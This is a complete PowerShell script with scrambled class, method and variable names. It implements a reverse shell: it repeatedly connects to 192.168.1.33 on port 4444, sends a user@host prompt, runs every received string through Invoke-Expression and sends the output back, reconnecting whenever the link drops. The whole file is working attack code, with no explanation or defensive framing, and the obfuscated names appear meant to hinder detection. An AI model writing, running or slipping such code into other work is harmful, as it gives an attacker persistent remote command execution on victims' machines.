class wpPom {
    
    [string]$WfqBfIi = "192.168.1.33"
    [int]$vcmimnNNKmZSP = 4444

    $uFtsOsjxPFEzezlQqeFL
    $dxhDktRxpVxXweToNeZ
    $UVgWuASWWbCA
    $pAAIquzNnXXYSqbeoXolA
    $eeQgMOVqCZRothPEjFKMWGQ
    $mBqrdjyTBxlfBHcOhoOfjO
    [int]$xaLhnzlJQsSIX = 50*1024

    dNgzDuqJaMQXHE() {
        $this.dxhDktRxpVxXweToNeZ = $false
        while ($true) {
            try {
                $this.dxhDktRxpVxXweToNeZ = New-Object Net.Sockets.TcpClient($this.WfqBfIi, $this.vcmimnNNKmZSP)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.UKFJhuGs()
    }

    UKFJhuGs() {
        $this.uFtsOsjxPFEzezlQqeFL = $this.dxhDktRxpVxXweToNeZ.GetStream()
        $this.pAAIquzNnXXYSqbeoXolA = New-Object Byte[] $this.xaLhnzlJQsSIX
        $this.mBqrdjyTBxlfBHcOhoOfjO = New-Object Text.UTF8Encoding
        $this.UVgWuASWWbCA = New-Object IO.StreamWriter($this.uFtsOsjxPFEzezlQqeFL, [Text.Encoding]::UTF8, $this.xaLhnzlJQsSIX)
        $this.eeQgMOVqCZRothPEjFKMWGQ = New-Object System.IO.StreamReader($this.uFtsOsjxPFEzezlQqeFL)
        $this.UVgWuASWWbCA.AutoFlush = $true
    }

    IclRWDHFocItsIZIzPfHTN() {
        $this.dNgzDuqJaMQXHE()
        $this.xynGJPwNWJpdrCHzoEitPS()
    }

    cbgpiJetClxN($BBOxKUEwPDTUNwVbFc) {
        try {
            [byte[]]$gKiuPWiml = [text.Encoding]::Ascii.GetBytes($BBOxKUEwPDTUNwVbFc)
            $this.UVgWuASWWbCA.Write($gKiuPWiml, 0, $gKiuPWiml.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.IclRWDHFocItsIZIzPfHTN()
        }
    }

    [string] UBgYhjclFlqPUU() {
        try {
            $OuVZz = $this.uFtsOsjxPFEzezlQqeFL.Read($this.pAAIquzNnXXYSqbeoXolA, 0, $this.xaLhnzlJQsSIX)    
            $WYXhmrmlNH = ($this.mBqrdjyTBxlfBHcOhoOfjO.GetString($this.pAAIquzNnXXYSqbeoXolA, 0, $OuVZz))
            return $WYXhmrmlNH
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.IclRWDHFocItsIZIzPfHTN()
            return ""
        }
    }

    [string] QMEALatF($YAHvbmMYQ) {
        Write-Host $YAHvbmMYQ
        try { 
            $AMijGbBLmBBMJQTBGUewuc = Invoke-Expression $YAHvbmMYQ | Out-String
        }
        catch {
            $FQSHqCTj = $_.Exception
            $TktJPiOGj = $_.Message
            $AMijGbBLmBBMJQTBGUewuc = "`n$_`n"
        }
        return $AMijGbBLmBBMJQTBGUewuc
    }

    [string] vqoqsElKcDuAMY() {
        $PobFgTHuOFVOqmMvSSlFzhwe = [Environment]::UserName
        $nNBZfSJdVwIjeriT = [System.Net.Dns]::GetHostName()
        $JansAK = Get-Location
        return "$PobFgTHuOFVOqmMvSSlFzhwe@$nNBZfSJdVwIjeriT [$JansAK]~$ "
    }

    xynGJPwNWJpdrCHzoEitPS() {
        while ($this.dxhDktRxpVxXweToNeZ.Connected) {
            $this.cbgpiJetClxN($this.vqoqsElKcDuAMY())         
            $WYXhmrmlNH = $this.UBgYhjclFlqPUU()
            $AMijGbBLmBBMJQTBGUewuc = "`n"
            if ([string]::IsNullOrEmpty($WYXhmrmlNH)) {
                continue
            }
            $AMijGbBLmBBMJQTBGUewuc = $this.QMEALatF($WYXhmrmlNH)
            $this.cbgpiJetClxN($AMijGbBLmBBMJQTBGUewuc + "`n")
            $this.uFtsOsjxPFEzezlQqeFL.Flush()
        }
        $this.dxhDktRxpVxXweToNeZ.Close()
        $this.IclRWDHFocItsIZIzPfHTN()
    } 
}

$NkQDhighttqlM = [wpPom]::new()
$NkQDhighttqlM.IclRWDHFocItsIZIzPfHTN()
